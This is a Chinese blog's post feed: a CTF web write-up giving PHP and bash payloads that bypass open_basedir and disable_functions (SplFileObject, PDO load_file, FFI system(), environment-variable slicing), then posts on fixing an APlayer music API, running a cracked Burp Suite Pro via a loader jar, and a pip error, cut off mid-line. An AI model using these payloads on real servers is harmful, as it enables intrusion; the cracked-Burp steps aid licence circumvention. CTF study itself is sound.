class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== false ) {<br>                        echo <span class="hljs-string">"filename:"</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">"\n"</span>;<br>                }<br>                closedir(<span class="hljs-variable">$b</span>);<br>        }<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></tbody></table></figure><h3 id="web73-74"><a href="#web73-74" class="headerlink" title="web73,74"></a>web73,74</h3><p>可以使用php原生类来做题：</p><p>先DirectoryIterator获取目录,再SplFileObject读取文件；</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">"glob:///*"</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>){ echo <span class="hljs-variable">$f</span>.<span class="hljs-string">'~'</span> ; };<span class="hljs-keyword">exit</span>;<br>c=<span class="hljs-variable">$a</span>=new SplFileObject(<span class="hljs-string">"/flagc.txt"</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>){ echo <span class="hljs-variable">$f</span>};<span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></tbody></table></figure><p>代码执行逻辑：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$a</span> = new SplFileObject(<span class="hljs-string">"/flagc.txt"</span>);：创建一个 SplFileObject 对象，将文件路径 <span class="hljs-string">"/flagc.txt"</span> 作为参数传递给构造函数。SplFileObject 是 PHP 提供的一个类，用于读取文件内容。<br>foreach (<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)：使用 foreach 循环遍历 SplFileObject 对象 <span class="hljs-variable">$a</span>，将每行内容赋给变量 <span class="hljs-variable">$f</span>。<br>echo <span class="hljs-variable">$f</span>;：在每次循环中，使用 echo 语句将变量 <span class="hljs-variable">$f</span> 的值输出到浏览器。这将逐行显示文件内容。<br><span class="hljs-keyword">exit</span>();：使用 <span class="hljs-keyword">exit</span>() 函数终止脚本的执行，确保只输出文件内容而不继续执行其他代码<br></code></pre></td></tr></tbody></table></figure><h3 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h3><p>利用上述方法可以读取到flag在flag36.txt,但是无法读取到数据，报错：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">Fatal error: Uncaught RuntimeException: SplFileObject::<span class="hljs-built_in">__construct</span>(): open_basedir restriction in effect. <span class="hljs-built_in">File</span>(/flag36.txt) is not within the allowed <span class="hljs-built_in">path</span>(s): (/var/www/html/) in /var/www/html/index.<span class="hljs-built_in">php</span>(<span class="hljs-number">19</span>) : <span class="hljs-built_in">eval</span>()<span class="hljs-string">'d code:1 Stack trace: #0 /var/www/html/index.php(19) : eval()'</span>d <span class="hljs-built_in">code</span>(<span class="hljs-number">1</span>): SplFileObject-&gt;<span class="hljs-built_in">__construct</span>(<span class="hljs-string">'/flag36.txt'</span>) #<span class="hljs-number">1</span> /var/www/html/index.<span class="hljs-built_in">php</span>(<span class="hljs-number">19</span>): <span class="hljs-built_in">eval</span>() #<span class="hljs-number">2</span> {<span class="hljs-selector-tag">main</span>} thrown in /<span class="hljs-selector-tag">var</span>/www/<span class="hljs-selector-tag">html</span>/index<span class="hljs-selector-class">.php</span>(<span class="hljs-number">19</span>) : <span class="hljs-built_in">eval</span>()<span class="hljs-string">'d code on line 1</span><br></code></pre></td></tr></tbody></table></figure><p>我们仍可以用上一题方法读到文件名；但读不出来数据，直接包含也不行；</p><p>这里要通过数据库来读取该文件，前提是我们要知道数据库的信息</p><p>通过sql语句绕过open_basedir和disable_function</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=try {<span class="hljs-variable">$dbh</span> = new PDO(<span class="hljs-string">'mysql:host=localhost;dbname=ctftraining'</span>, <span class="hljs-string">'root'</span>,<span class="hljs-string">'root'</span>);foreach(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">'select load_file("/flag36.txt")'</span>) as <span class="hljs-variable">$row</span>){echo(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">"|"</span>; }<span class="hljs-variable">$dbh</span> = null;}catch (PDOException <span class="hljs-variable">$e</span>) {echo <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);}<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></tbody></table></figure><h3 id="web77✘"><a href="#web77✘" class="headerlink" title="web77✘"></a>web77✘</h3><p>依然可以通过PHP原生类获取flag所在文件：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">"glob:///*"</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>){ echo <span class="hljs-variable">$f</span>.<span class="hljs-string">'~'</span> ; };<span class="hljs-keyword">exit</span>;<br></code></pre></td></tr></tbody></table></figure><p>两个文件flag36x.txt和readflag,我们要通过执行readflag的脚本来拿到flag</p><p>php7.4的特性可以利用ffi函数接口</p><p>FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。</p><p>payload: 查文件还是利用原生类即可；</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">c=<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">"int system(const char *command);"</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">"/readflag &gt;/var/www/html/1.txt"</span>; <span class="hljs-regexp">//</span>在这里修改命令<br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></tbody></table></figure><h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>])){<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'code'</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/\x09|\x0a|[a-z]|[0-9]|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\'|\"|\`|\||\,/'</span>, <span class="hljs-variable">$code</span>)){<br><span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;div align="center"&gt;'</span>.<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">'&lt;/div&gt;'</span>;<br>}<br><span class="hljs-keyword">else</span>{<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;div align="center"&gt;evil input&lt;/div&gt;'</span>;<br>}<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>查看首页源码提示：</p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- system($code);--&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>Linux 操作系统中有许多内置的环境变量，它们提供了系统和用户级别的配置和信息。下面是一些常见的 Linux 内置变量的介绍：</p><ol><li>PATH：指定可执行程序的搜索路径。当您在终端中输入一个命令时，系统会按照 PATH 中指定的路径顺序搜索可执行文件。</li><li>HOME：指定当前用户的主目录路径。当您在终端中使用 <code>cd ~</code> 或 <code>cd</code> 命令时，会切换到 HOME 目录。</li><li>USER 和 USERNAME：当前登录用户的用户名。</li><li>SHELL：指定当前用户所使用的默认 shell 程序的路径。</li><li>PWD：当前工作目录的路径。当您在终端中使用 <code>pwd</code> 命令时，会显示当前所在的路径。</li></ol><p>${PATH}环境变量 /bin</p><p>${PWD}当前目录 /var/www/html</p><p>我们可以使用${PATH:~0}得到环境变量的最后一位字符n,数字可以由字母替代</p><p>可以使用切片取得返回的字母 例:${PWD:0:1}</p><p>payload:</p><p>这里数字不可用</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">${</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>}<span class="hljs-variable">${</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>}$<span class="hljs-variable constant_">IFS</span>?<span class="hljs-string">??</span><span class="hljs-string">?.</span><span class="hljs-string">??</span>?  <span class="hljs-comment">#nl flag.php</span><br></code></pre></td></tr></tbody></table></figure><h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p>这个题需要用到三个变量：</p><pre><code class="hljs">PHP_CFLAGS=-fstack-protector-strong # 通过前面的题配置文件获得获得PHP_VERSION=7.3.22 # php版本SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时${SHLVL}=2</code></pre><p>py1:tac flag.txt</p><p>在PHP_CFLAGS中，直接就有tac可以使用，从第三位开始占三个位置，我们需要得到版本号中的三，从而直接使用tac，经测试${PHP_VERSION:${PHP_VERSION:<del>A}:</del>${SHLVL}}的长度为三，是我们所需要的，构造payload：</p><figure class="highlight ruby"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_CFLAGS</span><span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:~A</span>}<span class="hljs-symbol">:~</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">SHLVL</span>}}<span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">PHP_VERSION</span><span class="hljs-symbol">:~A</span>}<span class="hljs-symbol">:~</span><span class="hljs-variable">${</span><span class="hljs-variable constant_">SHLVL</span>}}} <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br></code></pre></td></tr></tbody></table></figure><p>PY2:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">{PWD:<span class="hljs-variable">${#}</span>:<span class="hljs-variable">${#SHLVL}</span>}???<span class="hljs-variable">${PWD:<span class="hljs-variable">${#}</span>:<span class="hljs-variable">${#SHLVL}</span>}</span>?<span class="hljs-variable">${USER:~<span class="hljs-variable">${PHP_VERSION:~A}</span>:<span class="hljs-variable">${PHP_VERSION:~A}</span>}</span> ????.???</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">pwd</span>=/var/www/html</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-variable">${#}</span>是0，<span class="hljs-variable">${SHLVL}</span>为1</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">USER=www-data</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">payload即为 /???/?at ????.???   即/bin/cat flag.php</span><br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>解决博客aplayer插件音乐失效问题</title>
    <link href="/posts/20230613-739f3d10.html"/>
    <url>/posts/20230613-739f3d10.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="ISSUE"><a href="#ISSUE" class="headerlink" title="ISSUE"></a>ISSUE</h2><p>解决博客aplayer插件音乐失效问题</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天发现博客音乐失效了，找找原因，解决下失效问题。</p><p>如果你只想知道关于aplayer插件音乐失效问题的内容，请在目录中找到需要的内容。</p><h2 id="Aplayer使用"><a href="#Aplayer使用" class="headerlink" title="Aplayer使用"></a>Aplayer使用</h2><p>音乐插件:hexo-tag-aplayer 官网：<a href="https://aplayer.js.org/#/">链接</a></p><p>安装执行以下命令：</p><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install <span class="hljs-comment">--save hexo-tag-aplayer</span><br></code></pre></td></tr></tbody></table></figure><p>因为最新的aplayer版本已经支持MetingJS,往文章插入音乐使用起来更为方便，在aplayer启用MetingJS：</p><p>打开博客配置文件_config.yml，编辑以下内容：</p><figure class="highlight yaml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">aplayer:</span><br>  <span class="hljs-attr">meting:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></tbody></table></figure><p>文章插入音乐的方式：</p><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">{% meting <span class="hljs-string">"歌曲ID"</span> <span class="hljs-string">"服务器"</span> <span class="hljs-string">"类型"</span> <span class="hljs-string">"theme:#555"</span> <span class="hljs-string">"mutex:true"</span> <span class="hljs-string">"listmaxheight:340px"</span> <span class="hljs-string">"preload:auto"</span> %}<br></code></pre></td></tr></tbody></table></figure><p>在文章添加以上代码就可以在文章任何位置添加音乐了。</p><p>参数说明：</p><p>server指音乐平台，netease指网易云音乐，tencent指的是QQ音乐</p><p>一个完整的播放器至少指定音乐平台，类型和标识资源的ID</p><table><thead><tr><th>选项</th><th>默认</th><th>描述</th></tr></thead><tbody><tr><td>id(编号)</td><td>必须</td><td>歌曲ID /播放列表ID /专辑ID /搜索关键字</td></tr><tr><td>server(平台)</td><td>必须</td><td>音乐平台：netease，tencent，kugou，xiami，baidu</td></tr><tr><td>type（类型）</td><td>必须</td><td>song，playlist，album，search，artist</td></tr><tr><td>auto（支持类种 类）</td><td>options</td><td>音乐链接，支持：netease，tencent，xiami</td></tr><tr><td>fixed（固定模式）</td><td>false</td><td>启用固定模式，默认false</td></tr><tr><td>mini（迷你模式）</td><td>false</td><td>启用迷你模式,默认false</td></tr><tr><td>autoplay（自动播放）</td><td>false</td><td>音频自动播放，默认false</td></tr><tr><td>theme(主题颜色)</td><td>#2980b9</td><td>默认#2980b9</td></tr><tr><td>loop（循环）</td><td>all</td><td>播放器循环播放，值：“all”，one”，“none”</td></tr><tr><td>order(顺序)</td><td>list</td><td>播放器播放顺序，值：“list”，“random”</td></tr><tr><td>preload(加载)</td><td>auto</td><td>值：“none”，“metadata”，“’auto”</td></tr><tr><td>volume（声量）</td><td>0.7</td><td>默认音量，请注意播放器会记住用户设置，用户自己设置音量后默认音量将不起作用</td></tr><tr><td>mutex（限制）</td><td>true</td><td>防止同时播放多个玩家，在该玩家开始播放时暂停其他玩家</td></tr><tr><td>lrc-type（歌词）</td><td>0</td><td>歌词显示</td></tr><tr><td>list-folded（列表折叠）</td><td>false</td><td>指示列表是否应该首先折叠</td></tr><tr><td>list-max-height（最大高度）</td><td>340px</td><td>列出最大高度</td></tr><tr><td>storage-name（储存名称）</td><td>metingjs</td><td>存储播放器设置的localStorage键</td></tr></tbody></table><p>下面我以MetingJS在文章插入网易云音乐中的音乐来说明使用方法。</p><h3 id="使用示例：网易云音乐"><a href="#使用示例：网易云音乐" class="headerlink" title="使用示例：网易云音乐"></a>使用示例：网易云音乐</h3><p>1.进入网易云音乐网页版</p><p>​<a href="https://music.163.com/">网易云音乐网页版链接</a></p><p>2.找到资源的ID</p><p>如谭晶的《爱的神话》，在网易云音乐的链接是<code>https://music.163.com/#/song?id=26217047</code></p><p>26217047就是标识这首歌资源的唯一ID，类型就是song</p><p>插入文章的代码的一个示例：</p><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">{% meting <span class="hljs-string">"26217047"</span> <span class="hljs-string">"netease"</span> <span class="hljs-string">"song"</span> <span class="hljs-string">"theme:#555"</span> <span class="hljs-string">"mutex:true"</span> <span class="hljs-string">"listmaxheight:340px"</span> <span class="hljs-string">"preload:auto"</span> %}<br></code></pre></td></tr></tbody></table></figure>    <div id="aplayer-SlgTyMMz" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="26217047" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div><p>如果是想引用歌单到文章中：</p><p>某个歌单的链接：<code>https://music.163.com/#/playlist?id=2983726621</code></p><p>歌单ID就是2983726621，类型是playlist</p><p>插入文章的代码的一个示例：</p><figure class="highlight mel"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">{% meting <span class="hljs-string">"2983726621"</span> <span class="hljs-string">"netease"</span> <span class="hljs-string">"playlist"</span> <span class="hljs-string">"theme:#555"</span> <span class="hljs-string">"mutex:true"</span> <span class="hljs-string">"listmaxheight:340px"</span> <span class="hljs-string">"preload:auto"</span> %}<br></code></pre></td></tr></tbody></table></figure><h2 id="音乐失效问题"><a href="#音乐失效问题" class="headerlink" title="音乐失效问题"></a>音乐失效问题</h2><h3 id="原因和解决方法"><a href="#原因和解决方法" class="headerlink" title="原因和解决方法"></a>原因和解决方法</h3><p>Aplayer用来解析的API失效了，在博客目录下<strong>Blog\Hexo\node_modules\meting\dist</strong>下可以找到用来解析的API:</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.i-meto.com<span class="hljs-regexp">/meting/</span>api<br></code></pre></td></tr></tbody></table></figure><p>因此只要替换掉失效的API就可以了，从网络中找到的一个API:</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.injahow.cn<span class="hljs-regexp">/meting/</span><br></code></pre></td></tr></tbody></table></figure><p>尝试在网页中调用API:</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230613145703665.png" alt="image-20230613145703665"></p><p>成功解析，但是这个api的链接有些奇怪了🤦‍♂️</p><p>替换<strong>Blog\Hexo\node_modules\meting\dist</strong>目录下的Meting.min.js文件内容：</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>api.i-meto.com<span class="hljs-regexp">/meting/</span>api --&gt; https:<span class="hljs-regexp">//</span>api.injahow.cn<span class="hljs-regexp">/meting/</span><br></code></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230613150050677.png" alt="image-20230613150050677"></p><p>最后刷新缓存，就可以看到文章中的音乐已经重新解析成功了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>分享一首好听的歌</p><script src="https://cdn.jsdelivr.net/npm/hls.js"></script><p><video id="video" controls="" style="height: 100%;width: 100%;object-fit: cover"></video></p><script>  var video = document.getElementById('video');  var videoSrc = 'https://cdn.jsdelivr.net/gh/Honexz/video@5/Love.you.105.degree/ra105dn.m3u8';  if (Hls.isSupported()) {    var hls = new Hls();    hls.loadSource(videoSrc);    hls.attachMedia(video);    hls.on(Hls.Events.MANIFEST_PARSED, function() {      video.removeAttribute('muted'); // 取消静音      video.play(); // 开始播放    });  } else if (video.canPlayType('application/vnd.apple.mpegurl')) {    video.src = videoSrc;    video.addEventListener('loadedmetadata', function() {      video.removeAttribute('muted'); // 取消静音      video.play(); // 开始播放    });  }</script><p>哔哩哔哩 UP主:<strong><a href="https://space.bilibili.com/1950658">早稻叽</a></strong></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>简记一次对burpsuite的更新</title>
    <link href="/posts/20230610-963d4df1.html"/>
    <url>/posts/20230610-963d4df1.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>简记一次对burpsuite的更新</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前安装注册的BP是在国光的博客里找的教程和资源，有英文和汉化版本，版本是v2020.9.2，但是有个问题，就是光标和文字有两个文字的误差，用起来很别扭，我一直以为是版本或者汉化问题，就没有继续折腾了。今天又用到BP，实在是受不了了，打算换个新版本的BP。</p><p>我在升级BP的过程中，偶尔看到有人问显示问题，才发现以上问题是BP缩放导致的，我哭死。</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>资源链接：<a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1544866">吾爱</a>，同时也十分感谢作者的无私分享！</p><h2 id="激活"><a href="#激活" class="headerlink" title="激活"></a>激活</h2><p>这里看了下更新列表，选择了 BPv2022.9.2版本，下载解压，注意不要修改文件名。可阅读解压目录下的帮助文件， “说明.txt”。</p><p>重置激活状态bat:</p><figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vim">@echo off<br><span class="hljs-keyword">echo</span> Reset the activation status of burpsuite<br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> deleting roaming <span class="hljs-keyword">profile</span> data..<br>rd /s /q <span class="hljs-string">"%userprofile%\AppData\Roaming\BurpSuite\"</span><br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> deleting javasoft registry <span class="hljs-built_in">keys</span>..<br><span class="hljs-keyword">reg</span> <span class="hljs-keyword">delete</span> <span class="hljs-string">"HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\burp"</span> /<span class="hljs-keyword">f</span><br><span class="hljs-keyword">echo</span>.<br><span class="hljs-keyword">echo</span> done!<br><span class="hljs-keyword">echo</span>.<br>pause<br></code></pre></td></tr></tbody></table></figure><p>也就是说，会删除配置文件，如果有需要，请备份C盘下%userprofile%\AppData\Roaming\BurpSuite\目录下的文件。</p><p>然后就是选择解压目录下的<strong>EN-JRE Burp.bat</strong>文件来注册激活BP。资源链接里有一个激活教程。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>新建一个vbs文件，编辑以下内容：</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">CreateObject</span><span class="hljs-params">(<span class="hljs-string">"WScript.Shell"</span>)</span></span><span class="hljs-selector-class">.Run</span> <span class="hljs-string">""</span><span class="hljs-string">"java"</span><span class="hljs-string">" --illegal-access=permit -Dsun.java2d.uiScale=1 -javaagent:BurpSuiteChs.jar -Dfile.encoding=utf-8 -noverify -javaagent:BurpSuiteLoader.jar -jar burpsuite_pro_org.jar"</span>, <span class="hljs-number">0</span><br></code></pre></td></tr></tbody></table></figure><p>保存后发送快捷方式到桌面，就可以快速启动BP了。</p><h3 id="参数说明："><a href="#参数说明：" class="headerlink" title="参数说明："></a>参数说明：</h3><p>-javaagent:BurpSuiteChs.jar：用于启动 BurpSuite 的汉化 jar 包</p><p>-Dsun.java2d.uiScale=1：强制BurpSuite缩放比为100%</p><h2 id="ISSUE"><a href="#ISSUE" class="headerlink" title="ISSUE"></a>ISSUE</h2><p>BurpSuite文本框里的光标和文字存在偏移</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>在启动BP的脚本加上参数-Dsun.java2d.uiScale=1，设置后，BP字体会很小，可以在BP的user options中的display设置字体大小。</p><p><img src="https://cdn.jsdelivr.net/gh/Honexz/typora_image//image-20230610155157246.png" alt="image-20230610155157246"></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>记录使用pip命令的一次踩坑</title>
    <link href="/posts/20230609-1840438d.html"/>
    <url>/posts/20230609-1840438d.html</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>pip 是 Python 的包管理器。这意味着它是一个工具,允许你安装和管理不属于标准库的其他库和依赖。</p><h3 id="issue"><a href="#issue" class="headerlink" title="issue"></a>issue</h3><p>issue:pip报错：ValueError: check_hostname requires server_hostname</p><h3 id="记录使用pip命令的一次踩坑"><a href="#记录使用pip命令的一次踩坑" class="headerlink" title="记录使用pip命令的一次踩坑"></a>记录使用pip命令的一次踩坑</h3><p>今天使用dirsearch,突然抽风报错，说缺少依赖，就安装依赖呗，dirsearch下有个文件requirements.txt，记录了其所需的依赖。</p><figure class="highlight cmake"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></tbody></table></figure><p>执行命令报错：</p><blockquote><p>ERROR: Exception:</p><p>Traceback (most recent call last):<br>File “d:\python\lib\site-packages\pip_internal\cli\base_command.py”, line 180, in _main<br>status = self.run(options, args)<br>File “d:\python\lib\site-packages\pip_internal\cli\req_command.py”, line 205, in wrapper<br>return func(self, options, args)<br>File “d:\python\lib\site-packages\pip_internal\commands\install.py”, line 318, in run<br>requirement_set = resolver.resolve(<br>File “d:\python\lib\site-packages\pip_internal\resolution\resolvelib\resolver.py”, line 127……</p></blockquote><p>报错非常长，我习惯性的从ERROR后截取一段来搜索，搜索报错有两种原因：</p><p>1.pip版本过老</p><p>2.网络问题(更换国内镜像)</p><h3 id="检查报错原因1"><a href="#检查报错原因1" class="headerlink" title="检查报错原因1"></a>检查报错原因1</h3><p>这里习惯性的尝试了直接使用解决方法，升级pip</p><figure class="highlight ada"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">python -m pip install <span class="hljs-comment">--upgrade pip</span><br></code></pre></td></tr></tbody></table></figure><p>然后又是一堆报错，搜索报错的原因，提示我尝试清除缓存</p><figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pip cache purge</span><br></code></pre></td></tr></tbody></table></figure><p>又报错：</p><blockquote><p>ERROR: No matching packages</p></blockquote><p>搜索报错，网上给出的原因：缓存已经被清空或者是pip 版本较老导致的。</p><p>解决办法：</p><ol><li>升级pip：在命令行中执行 python -m pip install –upgrade pip命令，升级 pip到最新版本。然后再尝试执行 pip cache purge 命令。</li><li>直接删除缓存目录：在命令行中执行以下命令，手动删除 pip 的缓存目录：<ul><li>Windows：rmdir /s %HOME%\AppData\Local\pip\Cache</li><li>Linux/MacOS：rm -rf ~/.cache/pi</li></ul></li></ol><hr><p>看到这个回答，我想这不是形成了闭环吗？</p><p>到这里其实已经花费了很多时间，从互联网找答案真的很消耗耐心，各种信息里需要筛选正确的答案，很容易走弯路。</p><p>这个时候我反而安静下来了，我仔细想了一下 pip更新很快吗？我安装的pip版本是多少呢？</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> --version<br><span class="hljs-attribute">pip</span> <span class="hljs-number">21</span>.<span class="hljs-number">1</span>.<span class="hljs-number">3</span> from d:\python\lib\site-packages\pip (python <span class="hljs-number">3</span>.<span 